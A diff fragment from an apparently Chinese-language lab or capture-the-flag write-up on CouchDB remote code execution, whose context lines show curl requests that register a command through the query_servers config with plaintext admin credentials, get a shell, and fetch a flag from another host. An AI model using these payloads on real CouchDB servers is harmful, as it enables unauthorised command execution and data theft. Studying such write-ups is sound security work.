@@ -56,6 +56,7 @@ curl -X POST 'http://192.168.199.181:5984/teeest/_temp_view?limit=11' -d '{"lang
 getshell，读取flag
 ![成功](https://urahara3389.github.io/img/Couchdb-RCE-over.png)
 >同样你也可以不用登录获取Cookie，直接在curl请求中带入账号密码也是可以的，类似于这样，执行效果是一样的，这种方法可能更方便点吧
+
 ```
 root@Urahara:~# curl -X PUT 'admin:1qaz2wsx@192.168.199.165:5984/_config/query_servers/cmd' -d '"curl http://192.168.199.140/flag"'
 "curl http://192.168.199.140/flag"
